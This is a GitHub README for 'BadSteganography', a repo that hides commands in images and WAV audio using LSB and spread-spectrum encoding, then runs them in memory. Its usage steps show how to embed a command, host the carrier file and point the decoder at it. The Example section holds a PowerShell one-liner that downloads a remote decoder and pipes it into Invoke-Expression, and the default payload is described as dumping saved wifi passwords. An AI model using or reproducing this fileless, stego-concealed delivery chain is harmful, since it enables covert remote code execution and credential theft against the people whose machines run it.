# BadSteganography
Bad Steganography is a repo for encoding commands into images or wav files to execute such in memory. 

# Spread Spectrum Encoding
The steganography method used in the provided script is a form of audio steganography known as spread spectrum encoding. In spread spectrum encoding, the hidden message is embedded in a way that spreads its energy across the frequency spectrum of the carrier signal. This makes the hidden message less susceptible to detection and removal by typical audio processing techniques.

In this specific implementation, the amplitude of the audio samples is modified to represent the binary values of the message. By altering the amplitude, the hidden message is encoded into the audio signal, which can later be extracted using the same method.

# LSB Encoding
The steganography method used in the provided code is called “LSB (Least Significant Bit) steganography.” In this method, the least significant bit of each color channel (RGB) of the pixels in a specified region of an image is replaced with a bit of the secret data. This is done in such a way that the change is not visually noticeable in the image, but the secret data can be retrieved by reading the least significant bits of the color channels in the same region.

# Usage
For the spread spectrum encoding script, grab a audio file.
1. Replace the audio path in the py file
2. Replace the message with whatever command in the py file
![BadSteganographyspread_spectrum_decode txt at main · CharlesTheGreat77BadSteganography](https://github.com/CharlesTheGreat77/BadSteganography/assets/27988707/c184577f-c9b1-4bd6-a2ce-643e0a6abf43)
4. Run the py file and save the length of the message
5. In the decoder, replace the message Length variable to whatever the length of your message is (leave it as a multiple of 8)
![Screenshot 2024-01-15 at 1 12 20 PM](https://github.com/CharlesTheGreat77/BadSteganography/assets/27988707/16c9cdc6-ba85-41fb-8beb-d113d976f8b8)
7. Lastly, replace the url in the decoder to where your newly encoded audio file will be hosted.

# Example
This default payload grabs the contents of the decoder, which then downloads the audio to memory, decodes the message, and executes the command with Invoke-Expression
```
iex(iwr https://raw.githubusercontent.com/CharlesTheGreat77/BadSteganography/main/spread_spectrum_decode.txt).Content | iex
```
-- Saves wifi passwords to pass.txt
